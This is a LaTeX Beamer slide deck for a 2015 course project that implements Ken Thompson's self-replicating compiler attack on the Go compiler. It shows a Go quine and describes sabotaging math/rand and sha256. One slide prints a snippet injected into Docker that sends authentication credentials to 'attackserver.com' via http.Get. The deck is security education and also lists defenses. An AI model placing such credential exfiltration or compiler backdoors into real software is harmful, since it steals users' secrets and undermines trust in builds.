
\documentclass{beamer}

\mode<presentation>
{
  \usetheme{Warsaw}
  % or ...

  \setbeamercovered{invisible}
  % or whatever (possibly just delete it)
}


\usepackage[english]{babel}
% or whatever

\usepackage[utf8]{inputenc}
% or whatever

\usepackage{times}
\usepackage[T1]{fontenc}

\title[Gogojuice] % (optional, use only with long paper titles)
{Gogojuice: Reflections on Trusting Trust}

\subtitle
{An analysis of compiler-based attacks} % (optional)

\author %[Author, Another] % (optional, use only with lots of authors)
{Jeffrey Ling \and Rachit Singh}
% - Use the \inst{?} command only if the authors have different
%   affiliation.

\institute[CS 263 '15] % (optional, but mostly needed)
{
  CS 263 '15}
% - Use the \inst command only if there are several affiliations.
% - Keep it simple, no one is interested in your street address.

\date %[Short Occasion] % (optional)
{December 1, 2015}

%\subject{Talks}
% This is only inserted into the PDF information catalog. Can be left
% out. 

% If you wish to uncover everything in a step-wise fashion, uncomment
% the following command: 

\beamerdefaultoverlayspecification{<+->}


\begin{document}

\begin{frame}
  \titlepage
\end{frame}

%\begin{frame}{Outline}
 % \tableofcontents
  % You might wish to add the option [pausesections]
%\end{frame}


\begin{frame}{Compiler-Based Attacks} %{Subtitles are optional.}
  % - A title should summarize the slide in an understandable fashion
  %   for anyone how does not follow everything on the slide itself.

  \begin{itemize}
  \item An idea originally proposed by Ken Thompson (1984)
  \item The compiler will \dots
	\begin{itemize}
		\item inject malicious code into programs it compiles
		\pause
		\item inject a version of \emph{itself} if it compiles itself, thus making the compiler self-replicating
	\end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}{Our Project}
	\begin{figure}
	\centering
	\includegraphics[scale=0.2]{gopher}
	\end{figure}
	We implemented Ken Thompson's attack on the open source Go compiler.
\end{frame}

\begin{frame}{Quine}
	How do we make the compiler self-replicating?

\medskip
	\pause

	Using a \emph{quine}

\end{frame}


\begin{frame}[fragile]{Quine}
A quine in Go:

% want to move this left
\begin{figure}
\centering
\tiny
\begin{verbatim}
package main

import "fmt"

func main() {
  s := "package main\n\nimport \"fmt\"\n\nfunc main() {\n\ts := %#v\n\tfmt.Printf(s, s)\n}\n"
  fmt.Printf(s, s)
}
\end{verbatim}
\end{figure}

\normalsize
\end{frame}

\begin{frame}{Attacks}

We implemented the following attacks on the Go standard library:
\begin{itemize}
\item Fixed the \texttt{math/rand} seed to be constant
\item Fixed the \texttt{crypto/sha256} hash function to be constant
\end{itemize}

\end{frame}

\begin{frame}[fragile]{Attacks}
\begin{figure}
\centering
\includegraphics[scale=0.2]{docker}
\end{figure}

We also injected code into Docker, a container platform built in Go, to send authentication keys to a remote server.
\tiny
\begin{verbatim}
// this is a nice JSON structure containing username, password, etc.
var data = fmt.Sprintf("%#v", authConfig) 
resp, err := http.Get("http://attackserver.com?data=" + data)
\end{verbatim}
\normalsize
\end{frame}

\begin{frame}{Defenses}
How do we defend against a compiler that is self-replicating?
\begin{itemize}
\item Double compiling
\item Examining the raw binary for quine traces
\item Proper testing
\end{itemize}
\end{frame}

\begin{frame}{Summary}

  % need some help here
In this project we\dots
  \begin{itemize}
  \item Wrote gogojuice, a Go compiler that replicates itself
  \item Investigated attacks on the Go standard library and open source code
  \end{itemize}

\pause
\alert{Moral}: open source and the Internet can make trust deadly - the compiler can hide its own behavior!
  
\end{frame}

\begin{frame}
\Huge
Thanks!
\end{frame}


\end{document}


